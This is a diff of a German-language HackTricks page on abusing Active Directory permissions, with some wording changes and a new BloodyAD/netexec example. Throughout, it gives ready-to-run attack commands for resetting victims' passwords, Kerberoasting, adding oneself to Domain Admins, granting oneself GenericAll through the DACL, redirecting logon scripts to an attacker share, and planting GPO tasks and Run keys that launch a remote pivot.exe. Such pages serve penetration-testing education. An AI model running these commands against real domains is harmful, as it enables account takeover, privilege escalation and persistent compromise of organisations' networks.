@@ -2,9 +2,10 @@
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken von** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details, siehe die Originalartikel.**
+**Diese Seite ist hauptsächlich eine Zusammenfassung der Techniken aus** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **und** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Für weitere Details siehe die Originalartikel.**
 
 ## BadSuccessor
+
 
 {{#ref}}
 BadSuccessor.md
@@ -12,60 +13,68 @@ BadSuccessor.md
 
 ## **GenericAll-Rechte auf Benutzer**
 
-Dieses Privileg gewährt einem Angreifer die volle Kontrolle über ein Zielbenutzerkonto. Sobald die `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:
+Dieses Privileg gewährt einem Angreifer die volle Kontrolle über ein Ziel-Benutzerkonto. Sobald `GenericAll`-Rechte mit dem Befehl `Get-ObjectAcl` bestätigt sind, kann ein Angreifer:
 
-- **Das Passwort des Ziels ändern**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
-- **Gezieltes Kerberoasting**: Weisen Sie dem Benutzerkonto ein SPN zu, um es kerberoastable zu machen, und verwenden Sie dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT)-Hashes zu extrahieren und zu versuchen, sie zu knacken.
+- **Ändern des Passworts des Ziels**: Mit `net user <username> <password> /domain` kann der Angreifer das Passwort des Benutzers zurücksetzen.
+- **Targeted Kerberoasting**: Weise dem Benutzerkonto einen SPN zu, um es kerberoastable zu machen, und verwende dann Rubeus und targetedKerberoast.py, um die Ticket-Granting-Ticket (TGT) Hashes zu extrahieren und zu versuchen, sie zu knacken.
 ```bash
 Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
 .\Rubeus.exe kerberoast /user:<username> /nowrap
 Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
 ```
-- **Targeted ASREPRoasting**: Deaktivieren Sie die Vorab-Authentifizierung für den Benutzer, wodurch dessen Konto anfällig für ASREPRoasting wird.
+- **Targeted ASREPRoasting**: Deaktivieren Sie pre-authentication für den Benutzer, wodurch dessen Konto für ASREPRoasting anfällig wird.
 ```bash
 Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
 ```
-## **GenericAll-Rechte auf Gruppe**
+## **GenericAll-Rechte an einer Gruppe**
 
-Dieses Privileg ermöglicht es einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte auf einer Gruppe wie `Domain Admins` hat. Nachdem der Angreifer den distinguished name der Gruppe mit `Get-NetGroup` identifiziert hat, kann er:
+Dieses Privileg ermöglicht einem Angreifer, Gruppenmitgliedschaften zu manipulieren, wenn er `GenericAll`-Rechte an einer Gruppe wie `Domain Admins` hat. Nachdem er den Distinguished Name der Gruppe mit `Get-NetGroup` ermittelt hat, kann der Angreifer:
 
-- **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
+- **Sich selbst zur `Domain Admins`-Gruppe hinzufügen**: Dies kann über direkte Befehle oder mithilfe von Modulen wie Active Directory oder PowerSploit erfolgen.
 ```bash
 net group "domain admins" spotless /add /domain
 Add-ADGroupMember -Identity "domain admins" -Members spotless
 Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
 ```
+- Von Linux aus kannst du auch BloodyAD verwenden, um dich selbst zu beliebigen Gruppen hinzuzufügen, wenn du GenericAll/Write-Mitgliedschaft über sie hast. Wenn die Zielgruppe in „Remote Management Users“ verschachtelt ist, erhältst du sofort WinRM-Zugriff auf Hosts, die diese Gruppe berücksichtigen:
+```bash
+# Linux tooling example (BloodyAD) to add yourself to a target group
+bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>
+
+# If the target group is member of "Remote Management Users", WinRM becomes available
+netexec winrm <dc-fqdn> -u <user> -p '<pass>'
+```
 ## **GenericAll / GenericWrite / Write on Computer/User**
 
-Das Halten dieser Berechtigungen auf einem Computerobjekt oder einem Benutzerkonto ermöglicht:
+Wenn diese Privilegien auf einem Computerobjekt oder einem Benutzerkonto vorhanden sind, erlauben sie:
 
 - **Kerberos Resource-based Constrained Delegation**: Ermöglicht die Übernahme eines Computerobjekts.
-- **Shadow Credentials**: Verwenden Sie diese Technik, um ein Computer- oder Benutzerkonto zu impersonieren, indem Sie die Berechtigungen zum Erstellen von Shadow Credentials ausnutzen.
+- **Shadow Credentials**: Mit dieser Technik kann man sich als Computer- oder Benutzerkonto ausgeben, indem man die Privilegien ausnutzt, um Shadow Credentials zu erstellen.
 
 ## **WriteProperty on Group**
 
-Wenn ein Benutzer `WriteProperty`-Rechte auf alle Objekte für eine bestimmte Gruppe (z. B. `Domain Admins`) hat, kann er:
+Wenn ein Benutzer `WriteProperty`-Rechte auf alle Objekte einer bestimmten Gruppe (z. B. `Domain Admins`) hat, kann er:
 
-- **Sich Selbst zur Domain Admins Gruppe Hinzufügen**: Erreichbar durch die Kombination der Befehle `net user` und `Add-NetGroupUser`, ermöglicht diese Methode eine Privilegieneskalation innerhalb der Domäne.
+- **Sich selbst zur Domain Admins Group hinzufügen**: Erreichbar durch Kombination der Befehle `net user` und `Add-NetGroupUser`, ermöglicht diese Methode eine Privilegieneskalation innerhalb der Domain.
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
-## **Selbst (Selbstmitgliedschaft) in Gruppe**
+## **Self (Self-Membership) on Group**
 
-Dieses Privileg ermöglicht Angreifern, sich selbst zu bestimmten Gruppen hinzuzufügen, wie z.B. `Domain Admins`, durch Befehle, die die Gruppenmitgliedschaft direkt manipulieren. Die Verwendung der folgenden Befehlssequenz ermöglicht die Selbsthinzufügung:
+Dieses Privileg ermöglicht es Angreifern, sich selbst zu bestimmten Gruppen wie `Domain Admins` hinzuzufügen, indem sie Befehle verwenden, die die Gruppenmitgliedschaft direkt manipulieren. Mit der folgenden Befehlssequenz kann man sich selbst hinzufügen:
 ```bash
 net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
 ```
 ## **WriteProperty (Self-Membership)**
 
-Ein ähnliches Privileg, das Angreifern erlaubt, sich direkt zu Gruppen hinzuzufügen, indem sie die Gruppenattribute ändern, wenn sie das Recht `WriteProperty` für diese Gruppen haben. Die Bestätigung und Ausführung dieses Privilegs erfolgen mit:
+Eine ähnliche Berechtigung, sie erlaubt Angreifern, sich direkt zu Gruppen hinzuzufügen, indem sie Gruppenattribute ändern, sofern sie das Recht `WriteProperty` auf diesen Gruppen besitzen. Die Bestätigung und Ausführung dieser Berechtigung erfolgen mit:
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 net group "domain admins" spotless /add /domain
 ```
 ## **ForceChangePassword**
 
-Das Halten des `ExtendedRight` für einen Benutzer für `User-Force-Change-Password` ermöglicht Passwortzurücksetzungen, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Befehlszeilentools erfolgen, die mehrere Methoden zur Zurücksetzung des Passworts eines Benutzers bieten, einschließlich interaktiver Sitzungen und Einzeiler für nicht-interaktive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis hin zur Verwendung von `rpcclient` auf Linux, was die Vielseitigkeit der Angriffsvektoren demonstriert.
+Wenn man das `ExtendedRight` an einem Benutzer für `User-Force-Change-Password` hat, ermöglicht dies das Zurücksetzen des Passworts, ohne das aktuelle Passwort zu kennen. Die Überprüfung dieses Rechts und dessen Ausnutzung kann über PowerShell oder alternative Kommandozeilentools erfolgen und bietet mehrere Methoden, das Passwort eines Benutzers zurückzusetzen, einschließlich interactive sessions und one-liners für non-interactive Umgebungen. Die Befehle reichen von einfachen PowerShell-Aufrufen bis zur Verwendung von `rpcclient` unter Linux und zeigen die Vielseitigkeit der attack vectors.
 ```bash
 Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainUserPassword -Identity delegate -Verbose
@@ -76,9 +85,9 @@ Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureStri
 rpcclient -U KnownUsername 10.10.10.192
 > setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
 ```
-## **WriteOwner auf Gruppe**
+## **WriteOwner an einer Gruppe**
 
-Wenn ein Angreifer feststellt, dass er `WriteOwner`-Rechte über eine Gruppe hat, kann er die Eigentümerschaft der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da die Änderung der Eigentümerschaft eine umfassendere Kontrolle über die Gruppenattribute und die Mitgliedschaft ermöglicht. Der Prozess umfasst die Identifizierung des richtigen Objekts über `Get-ObjectAcl` und dann die Verwendung von `Set-DomainObjectOwner`, um den Eigentümer entweder durch SID oder Namen zu ändern.
+Wenn ein Angreifer feststellt, dass er über eine Gruppe `WriteOwner`-Rechte besitzt, kann er die Eigentümerschaft der Gruppe auf sich selbst ändern. Dies ist besonders wirkungsvoll, wenn es sich bei der betreffenden Gruppe um `Domain Admins` handelt, da eine Änderung des Eigentümers eine weitergehende Kontrolle über Gruppenattribute und Mitgliedschaften ermöglicht. Der Vorgang umfasst das Identifizieren des korrekten Objekts mittels `Get-ObjectAcl` und anschließend die Verwendung von `Set-DomainObjectOwner`, um den Eigentümer entweder per SID oder per Name zu ändern.
 ```bash
 Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
 Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
@@ -86,13 +95,13 @@ Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
 ```
 ## **GenericWrite auf Benutzer**
 
-Diese Berechtigung ermöglicht es einem Angreifer, Benutzerattribute zu ändern. Insbesondere kann der Angreifer mit `GenericWrite`-Zugriff den Anmeldeskriptpfad eines Benutzers ändern, um ein bösartiges Skript bei der Benutzeranmeldung auszuführen. Dies wird erreicht, indem der Befehl `Set-ADObject` verwendet wird, um die `scriptpath`-Eigenschaft des Zielbenutzers auf das Skript des Angreifers zu verweisen.
+Diese Berechtigung erlaubt einem Angreifer, Benutzerattribute zu ändern. Konkret kann der Angreifer mit `GenericWrite`-Zugriff den Pfad des Anmeldeskripts eines Benutzers ändern, um bei der Benutzeranmeldung ein bösartiges Skript auszuführen. Dies wird erreicht, indem der `Set-ADObject`-Befehl verwendet wird, um die Eigenschaft `scriptpath` des Zielbenutzers so zu aktualisieren, dass sie auf das Skript des Angreifers zeigt.
 ```bash
 Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
 ```
-## **GenericWrite auf Gruppe**
+## **GenericWrite on Group
 
-Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, indem sie sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess umfasst das Erstellen eines Anmeldeobjekts, die Verwendung dieses Objekts zum Hinzufügen oder Entfernen von Benutzern aus einer Gruppe und die Überprüfung der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
+Mit diesem Privileg können Angreifer die Gruppenmitgliedschaft manipulieren, z. B. sich selbst oder andere Benutzer zu bestimmten Gruppen hinzufügen. Dieser Prozess beinhaltet das Erstellen eines credential object, dessen Verwendung, um Benutzer einer Gruppe hinzuzufügen oder zu entfernen, und die Überprüfung der Mitgliedschaftsänderungen mit PowerShell-Befehlen.
 ```bash
 $pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
@@ -102,7 +111,7 @@ Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'use
 ```
 ## **WriteDACL + WriteOwner**
 
-Das Besitzen eines AD-Objekts und das Vorhandensein von `WriteDACL`-Befugnissen darauf ermöglicht es einem Angreifer, sich selbst `GenericAll`-Befugnisse über das Objekt zu gewähren. Dies wird durch ADSI-Manipulation erreicht, die vollständige Kontrolle über das Objekt und die Möglichkeit zur Änderung seiner Gruppenmitgliedschaften ermöglicht. Trotz dessen gibt es Einschränkungen, wenn versucht wird, diese Berechtigungen mit den `Set-Acl` / `Get-Acl` Cmdlets des Active Directory-Moduls auszunutzen.
+Wenn ein Angreifer ein AD-Objekt besitzt und `WriteDACL`-Berechtigungen darauf hat, kann er sich `GenericAll`-Berechtigungen für das Objekt gewähren. Dies wird durch ADSI-Manipulation erreicht, wodurch volle Kontrolle über das Objekt und die Möglichkeit entsteht, seine Gruppenmitgliedschaften zu ändern. Trotz­dem bestehen Einschränkungen beim Versuch, diese Berechtigungen mit den `Set-Acl` / `Get-Acl`-Cmdlets des Active Directory-Moduls auszunutzen.
 ```bash
 $ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
 $IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
@@ -110,64 +119,64 @@ $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityRe
 $ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
 $ADSI.psbase.commitchanges()
 ```
-## **Replikation im Domänenbereich (DCSync)**
+## **Replikation in der Domain (DCSync)**
 
-Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domäne, um einen Domänencontroller zu imitieren und Daten, einschließlich Benutzeranmeldeinformationen, zu synchronisieren. Diese leistungsstarke Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes`, die es Angreifern ermöglichen, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domänencontroller zu haben. [**Erfahren Sie hier mehr über den DCSync-Angriff.**](../dcsync.md)
+Der DCSync-Angriff nutzt spezifische Replikationsberechtigungen in der Domain, um einen Domain Controller zu imitieren und Daten zu synchronisieren, einschließlich Benutzeranmeldeinformationen. Diese mächtige Technik erfordert Berechtigungen wie `DS-Replication-Get-Changes` und ermöglicht Angreifern, sensible Informationen aus der AD-Umgebung zu extrahieren, ohne direkten Zugriff auf einen Domain Controller. [**Learn more about the DCSync attack here.**](../dcsync.md)
 
 ## GPO-Delegation <a href="#gpo-delegation" id="gpo-delegation"></a>
 
 ### GPO-Delegation
 
-Delegierter Zugriff zur Verwaltung von Gruppenrichtlinienobjekten (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn beispielsweise ein Benutzer wie `offense\spotless` GPO-Verwaltungsrechte delegiert bekommt, kann er über Berechtigungen wie **WriteProperty**, **WriteDacl** und **WriteOwner** verfügen. Diese Berechtigungen können für böswillige Zwecke missbraucht werden, wie mit PowerView identifiziert: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Delegierter Zugriff zur Verwaltung von Gruppenrichtlinienobjekten (GPOs) kann erhebliche Sicherheitsrisiken darstellen. Wenn einem Benutzer wie `offense\spotless` GPO-Verwaltungsrechte delegiert werden, kann dieser Privilegien wie **WriteProperty**, **WriteDacl** und **WriteOwner** besitzen. Diese Berechtigungen können zu böswilligen Zwecken missbraucht werden, wie mit PowerView identifiziert: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
 ### GPO-Berechtigungen auflisten
 
-Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit miteinander verknüpft werden. Dies ermöglicht die Entdeckung von GPOs, für die ein bestimmter Benutzer Berechtigungen zur Verwaltung hat: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
+Um falsch konfigurierte GPOs zu identifizieren, können die Cmdlets von PowerSploit verkettet werden. Dadurch lässt sich entdecken, welche GPOs ein bestimmter Benutzer verwalten darf: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`
 
-**Computer mit einer bestimmten Richtlinie angewendet**: Es ist möglich zu ermitteln, auf welche Computer eine bestimmte GPO angewendet wird, um den Umfang der potenziellen Auswirkungen zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
+**Computer, auf die eine bestimmte Richtlinie angewendet wird**: Es ist möglich zu ermitteln, auf welche Computer ein bestimmtes GPO angewendet wird, was hilft, den möglichen Einflussbereich zu verstehen. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`
 
-**Richtlinien, die auf einen bestimmten Computer angewendet werden**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.
+**Auf einen bestimmten Computer angewendete Richtlinien**: Um zu sehen, welche Richtlinien auf einen bestimmten Computer angewendet werden, können Befehle wie `Get-DomainGPO` verwendet werden.
 
-**OUs mit einer bestimmten Richtlinie angewendet**: Die Identifizierung von organisatorischen Einheiten (OUs), die von einer bestimmten Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.
+**OUs, auf die eine bestimmte Richtlinie angewendet ist**: Die Identifizierung der Organisationseinheiten (OUs), die von einer Richtlinie betroffen sind, kann mit `Get-DomainOU` erfolgen.
 
-Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs aufzulisten und Probleme darin zu finden.
+Sie können auch das Tool [**GPOHound**](https://github.com/cogiceo/GPOHound) verwenden, um GPOs zu enumerieren und Probleme darin zu finden.
 
-### Missbrauch von GPO - New-GPOImmediateTask
+### Missbrauch von GPOs - New-GPOImmediateTask
 
-Falsch konfigurierte GPOs können ausgenutzt werden, um Code auszuführen, beispielsweise durch das Erstellen einer sofortigen geplanten Aufgabe. Dies kann durchgeführt werden, um einen Benutzer zur lokalen Administratorgruppe auf betroffenen Maschinen hinzuzufügen, was die Berechtigungen erheblich erhöht:
+Fehlkonfigurierte GPOs können ausgenutzt werden, um Code auszuführen, zum Beispiel durch das Erstellen einer sofortigen geplanten Aufgabe. Dadurch kann ein Benutzer der lokalen Administratorgruppe auf betroffenen Maschinen hinzugefügt werden, was die Privilegien erheblich erhöht:
 ```bash
 New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
 ```
-### GroupPolicy-Modul - Missbrauch von GPO
+### GroupPolicy module - Abuse GPO
 
-Das GroupPolicy-Modul, wenn installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Präferenzen wie Registrierungswerten, um Backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass die GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, um die Ausführung zu ermöglichen:
+Das GroupPolicy module, falls installiert, ermöglicht die Erstellung und Verknüpfung neuer GPOs sowie das Setzen von Preferences wie registry values, um backdoors auf betroffenen Computern auszuführen. Diese Methode erfordert, dass das GPO aktualisiert wird und ein Benutzer sich am Computer anmeldet, damit die Ausführung erfolgt:
 ```bash
 New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
 Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
 ```
-### SharpGPOAbuse - Missbrauch von GPO
+### SharpGPOAbuse - Abuse GPO
 
-SharpGPOAbuse bietet eine Methode, um bestehende GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Modifikation bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
+SharpGPOAbuse bietet eine Methode, vorhandene GPOs zu missbrauchen, indem Aufgaben hinzugefügt oder Einstellungen geändert werden, ohne neue GPOs erstellen zu müssen. Dieses Tool erfordert die Änderung bestehender GPOs oder die Verwendung von RSAT-Tools, um neue zu erstellen, bevor Änderungen angewendet werden:
 ```bash
 .\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
 ```
-### Zwang zur Aktualisierung der Richtlinie
+### Richtlinienaktualisierung erzwingen
 
-GPO-Aktualisierungen erfolgen typischerweise alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach der Implementierung einer Änderung, kann der Befehl `gpupdate /force` auf dem Zielcomputer verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass alle Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.
+GPO-Aktualisierungen erfolgen in der Regel etwa alle 90 Minuten. Um diesen Prozess zu beschleunigen, insbesondere nach einer Änderung, kann auf dem Zielrechner der Befehl `gpupdate /force` verwendet werden, um eine sofortige Richtlinienaktualisierung zu erzwingen. Dieser Befehl stellt sicher, dass Änderungen an GPOs angewendet werden, ohne auf den nächsten automatischen Aktualisierungszyklus zu warten.
 
 ### Unter der Haube
 
-Bei der Überprüfung der geplanten Aufgaben für ein bestimmtes GPO, wie die `Misconfigured Policy`, kann die Hinzufügung von Aufgaben wie `evilTask` bestätigt werden. Diese Aufgaben werden durch Skripte oder Befehlszeilenwerkzeuge erstellt, die darauf abzielen, das Systemverhalten zu ändern oder Berechtigungen zu eskalieren.
+Bei der Überprüfung der Scheduled Tasks für eine bestimmte GPO, wie der `Misconfigured Policy`, lässt sich die Hinzufügung von Tasks wie `evilTask` feststellen. Diese Tasks werden durch Skripte oder Kommandozeilentools erstellt und zielen darauf ab, das Systemverhalten zu ändern oder Privilegien zu eskalieren.
 
-Die Struktur der Aufgabe, wie sie in der XML-Konfigurationsdatei dargestellt ist, die von `New-GPOImmediateTask` generiert wird, beschreibt die Einzelheiten der geplanten Aufgabe - einschließlich des auszuführenden Befehls und seiner Auslöser. Diese Datei zeigt, wie geplante Aufgaben innerhalb von GPOs definiert und verwaltet werden, und bietet eine Methode zur Ausführung beliebiger Befehle oder Skripte im Rahmen der Durchsetzung von Richtlinien.
+Die Struktur des Tasks, wie sie in der von `New-GPOImmediateTask` erzeugten XML-Konfigurationsdatei dargestellt ist, zeigt die Details des geplanten Tasks — einschließlich des auszuführenden Befehls und seiner Trigger. Diese Datei zeigt, wie Scheduled Tasks innerhalb von GPOs definiert und verwaltet werden und bietet eine Möglichkeit, beliebige Befehle oder Skripte im Rahmen der Durchsetzung von Richtlinien auszuführen.
 
 ### Benutzer und Gruppen
 
-GPOs ermöglichen auch die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch das direkte Bearbeiten der Richtliniendateien für Benutzer und Gruppen können Angreifer Benutzer zu privilegierten Gruppen, wie der lokalen `administrators`-Gruppe, hinzufügen. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Modifikation von Richtliniendateien erlaubt, um neue Benutzer hinzuzufügen oder Gruppenmitgliedschaften zu ändern.
+GPOs erlauben außerdem die Manipulation von Benutzer- und Gruppenmitgliedschaften auf Zielsystemen. Durch direkte Bearbeitung der Users and Groups-Policy-Dateien können Angreifer Benutzer zu privilegierten Gruppen hinzufügen, wie etwa der lokalen `administrators`-Gruppe. Dies ist durch die Delegation von GPO-Verwaltungsberechtigungen möglich, die die Änderung von Policy-Dateien zum Hinzufügen neuer Benutzer oder zur Anpassung von Gruppenmitgliedschaften zulässt.
 
-Die XML-Konfigurationsdatei für Benutzer und Gruppen beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen zu dieser Datei können bestimmten Benutzern erhöhte Berechtigungen auf betroffenen Systemen gewährt werden. Diese Methode bietet einen direkten Ansatz zur Eskalation von Berechtigungen durch GPO-Manipulation.
+Die XML-Konfigurationsdatei für Users and Groups beschreibt, wie diese Änderungen umgesetzt werden. Durch das Hinzufügen von Einträgen in diese Datei können bestimmte Benutzer erhöhte Rechte auf den betroffenen Systemen erhalten. Diese Methode bietet einen direkten Weg zur Privilegieneskalation durch GPO-Manipulation.
 
-Darüber hinaus können zusätzliche Methoden zur Ausführung von Code oder zur Aufrechterhaltung der Persistenz, wie die Nutzung von Anmelde-/Abmeldeskripten, das Ändern von Registrierungsschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder das Bearbeiten von Dienstkonfigurationen, ebenfalls in Betracht gezogen werden. Diese Techniken bieten verschiedene Möglichkeiten, um den Zugriff aufrechtzuerhalten und Zielsysteme durch den Missbrauch von GPOs zu kontrollieren.
+Außerdem können weitere Methoden zum Ausführen von Code oder zur Aufrechterhaltung von Persistenz in Betracht gezogen werden, wie etwa das Verwenden von logon/logoff-Skripten, das Ändern von Registryschlüsseln für Autoruns, die Installation von Software über .msi-Dateien oder das Bearbeiten von Service-Konfigurationen. Diese Techniken bieten verschiedene Wege, um durch Missbrauch von GPOs Zugang zu erhalten und Zielsysteme zu kontrollieren.
 
 ## Referenzen
 
